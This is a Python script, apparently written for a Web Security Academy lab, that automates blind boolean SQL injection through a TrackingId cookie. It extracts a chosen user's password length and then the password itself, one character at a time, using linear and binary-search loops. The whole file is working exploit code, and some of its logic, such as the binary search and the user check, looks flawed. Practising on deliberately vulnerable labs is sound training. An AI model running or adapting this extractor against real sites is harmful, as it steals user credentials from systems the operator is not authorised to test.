import requests

total_queries = 0
charset = "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
#for hex chars
target = "https://0a4b00f7035b1661803aee1000bd00b6.web-security-academy.net/"
needle = "Welcome back!"

def injected_query(payload):
    global total_queries
    #blind SQLi
    r = requests.get(target, cookies = {"TrackingId":"{}".format(payload)})
    total_queries += 1
    return needle.encode() in r.content

def boolean_query(offset, username, character, operator="="):
    payload = "10EadM4arYKr1BIO' AND (SELECT SUBSTRING(password,{},1) FROM users WHERE username='{}'){}'{}".format(offset, username, operator, character)
    print(payload)

    return injected_query(payload)

def invalid_user(username):
    payload = "(select id from user where username = {}) >= 0".format(username)
    return injected_query(payload)

def password_length(username):
    i = 0
    while True:
        payload = "10EadM4arYKr1BIO' AND (SELECT 'a' FROM users where username = '{}' AND LENGTH(password) <= {}) = 'a".format(username, i)
        if injected_query(payload):
            return i
        i += 1

def extract_hash(charset, username, password_length):
    found = ""
    #iterate over password length
    for i in range(1, password_length+1):
        for j in range(len(charset)):
            if boolean_query(i, username, charset[j]):
                found += charset[j]
                print(found)
                break
    return found

#binary search
def extract_hash_bst(charset, username, password_length):
    found = ""
    #iterate
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1:
                if start == 0 and boolean_query(index, username, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start + 1]
                break
            else:
                mid = (start + end) // 2
                if boolean_query(index, username, charset[mid]):
                    end = mid
                else:
                    start = mid
    return found

def total_queries_reqd():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0

while True:
    try:
        username = input(">> Enter user ID to extract password hash: ")
        if not invalid_user(username):
            user_password_length = password_length(username)
            print("\t[-] User {} hash length: {}".format(username, user_password_length))
            total_queries_reqd()
            print("\t[-] User {} hash: {}".format(username, extract_hash(charset, username, user_password_length)))
            total_queries_reqd()
            #for comparison
            print("\t[-] User {} hash: {}".format(username, extract_hash_bst(charset, username, user_password_length)))
            total_queries_reqd()
        else:
            print("\t[-] User {} does not exist!".format(username))
    #exit program
    except KeyboardInterrupt:
        break